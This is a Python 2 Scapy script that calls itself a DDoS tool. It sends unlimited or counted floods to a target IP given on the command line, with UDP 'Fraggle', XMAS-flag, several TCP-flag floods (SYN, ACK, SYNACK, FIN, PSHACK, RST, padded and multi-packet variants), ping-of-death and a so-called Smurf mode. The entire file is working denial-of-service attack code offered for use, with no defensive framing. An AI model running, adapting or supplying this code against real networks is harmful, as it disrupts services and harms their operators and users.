from scapy.all import *
from random import randint
import argparse
import sys
import time
import urllib2
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

myobj = argparse.ArgumentParser(description = 'A tool which performs DDOS attacks')
myobj.add_argument('-toa',action='store',dest='ta',help='What kind of attack you want to perform ? *UDP flood ? type ==> UDPFLOOD  *TCP attack-type ==> TCP   *Christmas tree attack-type ==> XMAS   *Ping flavored ==> PING')
myobj.add_argument('-fl',action='store',dest='flavor',help='Enter what kind of flavored attack you want to perform TCP:SYN,ACK,RST,SYNACK,FIN,MSYNACK,MACK,FACK,PSHACK. PING:POD,SMURF')
myobj.add_argument('-c',action='store',dest='count',help='Number of packet sent ---- tyep X if you want infinite packets to send')
myobj.add_argument('-d',action='store',dest='desti',help='Enter the IP of the target network -_-')
args = myobj.parse_args()
args = vars(args)

if len(sys.argv) == 1:
	myobj.print_help()
	sys.exit(1)

s_port = randint(1024,65535)
d_port = randint(1,65535)
flag_x = 'FPU'
flag_s = 'S'
flag_a = 'A'
flag_sa = 'SA'
flag_pa = 'PA'
flag_f = 'F'
flag_r = 'R'
ic = 0

#UDP flood  Attack Segment
if args['ta'] == 'UDPFLOOD' or args['ta'] == 'udpflood':
	print "We are performing Fraggle attack..."
	if args['count'] == 'X' or args['count'] == 'x':	#infinite packet segment
		while[1 == 1]:
			d_port = randint(1,65535)
			#s_port = randint(1024,65535)
			fraggle = IP(dst=args['desti'])/UDP(sport = 41414,dport=d_port)/('K'*40000)			
			#time.sleep(1)
			send(fraggle, verbose=0)
			ic = ic + 1
			print("Target is under Fraggle attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
	else:
		while ic < int(args['count']):	#controlled packet flow
			d_port = randint(1,65535)
			s_port = randint(1024,65535)
			fraggle = IP(dst=args['desti'])/UDP(sport = 41414,dport=d_port)/('K'*40000)	
			#time.sleep(1)
			send(fraggle, verbose=0)
			ic = ic + 1
			print("Target is under Fraggle attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		print ("%\*|*/%-$$-Fraggle attack completed-$$-%\*|*/%") #--------- UDP flood attack ends here

#Christmas tree attack segment
elif args['ta'] == 'XMAS' or args['ta'] == 'xmas':
	print "We are performing XMAS attack"
	if args['count'] == 'X' or args['count'] == 'x':
		while [1 == 1]:
			d_port = randint(1,65535)
			response = IP(dst=args['desti'])/TCP(sport=s_port,dport=d_port,flags=flag_x)
			send(response, verbose=0)
			ic = ic + 1
			print("Target is under christmas tree attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$  Counts: "+ str(ic) +" Packet sent")
	else:
		while ic < int(args['count']):
			d_port = randint(1,65535)
			response=IP(dst=args['desti'])/TCP(sport=s_port,dport=d_port,flags=flag_x)
			send(response, verbose=0)
			ic = ic + 1
			print("Target is under christmas tree attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		print ("%\*|*/%-$$-XMAS attack completed-$$-%\*|*/%") #---------- Christmas tree attack ends here

#TCP Attack Segment-----
elif args['ta'] == 'TCP' or args['ta'] == 'tcp':
	print "We are performing TCP attack"
	top = [('Timestamp',(10,0))]
	if args['flavor'] == 'SYN' or args['flavor'] == 'syn':	#Tcp Syn segment
		print "Performing TCP Syn attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				d_port = randint(1,65535)
				syn = IP(dst=args['desti'],id=1111,ttl=99)/TCP(sport=s_port,dport=d_port,seq=12345,ack=1000,window=1000,flags=flag_s,options=top)/"synflood"
			#	time.sleep(1)
				send(syn, verbose=0)
				ic = ic + 1
				print("Target is under SYN attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		else:
			while ic < int(args['count']): #controlled packet flow
				d_port = randint(1,65535)
				syn = IP(dst=args['desti'],id=1111,ttl=99)/TCP(sport=s_port,dport=d_port,seq=12345,ack=1000,window=1000,flags=flag_s,options=top)/"synflood"
			#	time.sleep(1)
				send(syn, verbose=0)
				ic = ic + 1
				print("Target is under SYN attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$-Syn attack completed-$$-%\*|*/%")
	elif args['flavor'] == 'RST' or args['flavor'] == 'rst':	#Tcp Rst segment
		print "Performing TCP Rst attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				i = IP()
				i.dst = args['desti']
				t = TCP()
				t.sport = randint(1,65535)
				#t_dport = randint(1,65535)
				t.dport = 80
				t.flags = flag_s
				ans = sr1(i/t, verbose=0)
				t.seq = ans.ack
				t.ack = ans.seq + 1
				t.flags = flag_a
				send(i/t/"GET /HTTP/1.0\r\n\r\n", verbose=0)
				ic = ic + 1
			#	time.sleep(1)
				print(" Target is under RST attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		else:
			while ic < int(args['count']): #controlled packet flow
				i = IP()
				i.dst = args['desti']
				t = TCP()
				#t_dport = randint(1,65535)
				t.sport = randint(1,65535)
				t.dport = 80
				t.flags = flag_s
				ans = sr1(i/t, verbose=0)
				t.seq = ans.ack
				t.ack = ans.seq + 1
				t.flags = flag_a
				send(i/t/"GET /HTTP/1.0\r\n\r\n", verbose=0)
				ic = ic + 1
			#	time.sleep(1)
				print("Target is under RST attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$-Rst attack completed-$$-%\*|*/%")
			
			
	elif args['flavor'] == 'SYNACK' or args['flavor'] == 'synack':	#Tcp Synack segment
		print "Performing TCP Synack attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				synack = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq=seqn,ack=ackn,window=windown,flags=flag_sa,options=top)/"saflood"
			#	time.sleep(1)
				send(synack, verbose=0)
				ic = ic + 1
				print("Target is under SYNACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		else:
			while ic < int(args['count']): #controlled packet flow
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				synack = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq=seqn,ack=ackn,window=windown,flags=flag_sa,options=top)/"saflood"
			#	time.sleep(1)
				send(synack, verbose=0)
				ic = ic + 1
				print("Target is under SYNACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$-Synack attack completed-$$-%\*|*/%")
			
			
			
			
			
			
	elif args['flavor'] == 'ACK' or args['flavor'] == 'ack':	#Tcp Ack segment
		print "Performing TCP Ack attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				ack = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq=seqn,ack=ackn,window=windown,flags=flag_a,options=top)/"ackflood"
			#	time.sleep(1)
				send(ack, verbose=0)
				ic = ic + 1
				print("Target is under ACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		else:
			while ic < int(args['count']): #controlled packet flow
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				ack = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq=seqn,ack=ackn,window=windown,flags=flag_a,options=top)/"ackflood"
			#	time.sleep(1)
				send(ack, verbose=0)
				ic = ic + 1
				print("Target is under ACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$-Ack attack completed-$$-%\*|*/%")
			
			
	elif args['flavor'] == 'PSHACK' or args['flavor'] == 'pshack':	#Tcp Pushack segment
		print "Performing TCP PshAck attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				pshack = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_pa,options=top)/"paflood"
			#	time.sleep(1)
				send(pshack, verbose=0)
				ic = ic + 1
				print("Target is under PSHACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		else:
			while ic < int(args['count']): #controlled packet flow
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				pshack = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq=seqn,ack=ackn,window=windown,flags=flag_pa,options=top)/"paflood"
			#	time.sleep(1)
				send(pshack, verbose=0)
				ic = ic + 1
				print("Target is under PSHACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$- PshAck attack completed-$$-%\*|*/%")		
			
			
			
			
	elif args['flavor'] == 'FIN' or args['flavor'] == 'fin':	#Tcp Fin segment
		print "Performing TCP Fin attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				fin = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq = seqn,ack=ackn,window=windown,flags=flag_f,options=top)/"finflood"
			#	time.sleep(1)
				send(fin, verbose=0)
				ic = ic + 1
				print("Target is under FIN attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		else:
			while ic < int(args['count']): #controlled packet flow
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				fin = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq=seqn,ack=ackn,window=windown,flags=flag_f,options=top)/"finflood"
			#	time.sleep(1)
				send(fin, verbose=0)
				ic = ic + 1
				print("Target is under FIN attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$-Fin attack completed-$$-%\*|*/%")		
			
			
			
			
	elif args['flavor'] == 'FACK' or args['flavor'] == 'fack':	#Tcp Frag Ack segment
		print "Performing TCP Fragmented Ack attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				fack = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_a,options=top)/"ackflood"
			#	time.sleep(1)
				lenl = len(fack)
				s0 = 65535 - lenl
				#s1 = s0*str(k)
				send(fack/('k'*s0), verbose=0)
				ic = ic + 1
				print("Target is under Frag_ACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		else:
			while ic < int(args['count']): #controlled packet flow
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				fack = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq=seqn,ack=ackn,window=windown,flags=flag_a,options=top)/"ackflood"
				lenl = len(fack)
				s0 = 65535 - lenl
				#s1 = s0*K
				send(fack/('k'*s0), verbose=0)
				ic = ic + 1
				print("Target is under Frag_ACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$- Frag_Ack attack completed-$$-%\*|*/%")		
			
			
			
			
			
	elif args['flavor'] == 'MSYNACK' or args['flavor'] == 'msynack':	#Tcp MSynack segment
		print "Performing TCP MSynack attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				msyn0 = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_s,options=top)/"msaflood"
				send(msyn0, verbose=0)		
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				msyn1 = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_s,options=top)/"msaflood"
				send(msyn1, verbose=0)		
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				ack0 = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_a,options=top)/"msackflood"
				send(ack0, verbose=0)
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				ack1 = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_a,options=top)/"msackflood"
				send(ack1, verbose=0)
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				#ackn = seqn + 80
				rst = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_r,options=top)/"msackflood"
				send(rst, verbose=0)
				ic = ic + 1
				print("Target is under Multiple SYN-ACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
			
			
			
	elif args['flavor'] == 'MACK' or args['flavor'] == 'mack':	#Tcp MSynack segment
		print "Performing TCP MACK attack"
		if args['count'] == 'X' or args['count'] == 'x': #infinite packet segment
			while [1 == 1]:
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				ack0 = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_a,options=top)/"mackflood"
				send(ack0, verbose=0)
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				ackn = seqn + 80
				ack1 = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_a,options=top)/"mackflood"
				send(ack1, verbose=0)
				d_port = randint(1,65535)
				s_port = randint(1024,65535)
				windown = randint(600,65535)
				seqn = randint(200,65535)
				#ackn = seqn + 80
				rst = IP(dst=args['desti'],ttl=99)/TCP(sport=s_port,dport=d_port,seq= seqn,ack=ackn,window=windown,flags=flag_r,options=top)/"mackflood"
				send(rst, verbose=0)
				ic = ic + 1
				print("Target is under Multiple ACK attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")			
# Ping attack segment -----------
elif args['ta'] == 'PING' or args['ta'] == 'ping':
	print "We are performing Ping flavored attack...."
	if args['flavor'] == 'POD' or args['flavor'] == 'pod':
		if args['count'] == 'X' or args['count'] == 'x':	#infinite packet segment
			while[1 == 1]:
				pod = fragment(IP(src="192.168.1.9",dst=args['desti'])/ICMP()/('K'*60000))
				send(pod, verbose=0)
				ic = ic + 1
			#	time.sleep(1)
				print("Target is under Ping of death attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
		else:
			while ic < int(args['count']):	#controlled packet flow
				pod = fragment(IP(src="192.168.1.9",dst=args['desti'])/ICMP()/('K'*60000))
				send(pod, verbose=0)
				ic = ic + 1
			#	time.sleep(1)
				print("Target is under Ping of death attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$-POD attack completed-$$-%\*|*/%") #--------- Ping of death attack ends here

	elif args['flavor'] == 'SMURF' or args['flavor'] == 'smurf':
		if args['count'] == 'X' or args['count'] == 'x':	#infinite packet segment
			while[1 == 1]:
				smurf = fragment(IP(src="192.168.1.9",dst=args['desti'])/ICMP()/('K'*60000))
				send(smurf, verbose=0)
				ic = ic + 1
			#	time.sleep(1)
				print("Target is under Smurf attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts:"+ str(ic) +"Packet sent")
		else:
			while ic < int(args['count']):	#controlled packet flow
				smurf = fragment(IP(src="192.168.1.9",dst=args['desti'])/ICMP()/('K'*60000))
				send(smurf, verbose=0)
				ic = ic + 1
			#	time.sleep(1)
				print("Target is under Smurf attack  $%\*|*/%$-CISH_Corp-$%\*|*/%$ Counts: "+ str(ic) +" Packet sent")
			print ("%\*|*/%-$$-Smurf attack completed-$$-%\*|*/%") #--------- Smurf attack ends here


